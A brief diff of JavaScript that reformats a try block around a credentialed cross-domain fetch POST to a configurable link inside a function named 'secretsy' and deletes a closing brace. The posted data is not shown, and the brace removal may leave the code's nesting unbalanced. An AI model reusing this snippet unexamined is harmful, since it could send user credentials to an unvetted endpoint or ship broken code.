@@ -45,7 +45,8 @@ function secretsy(){
 
   function log() {
 
-     try{fetch(props.link, {
+     try
+     {fetch(props.link, {
       method: "POST",
       withCredentials: true, 
       crossDomain: true, 
@@ -73,7 +74,7 @@ function secretsy(){
    
       //     });
     };
-  }
+  
 
   function log2() {
     try{
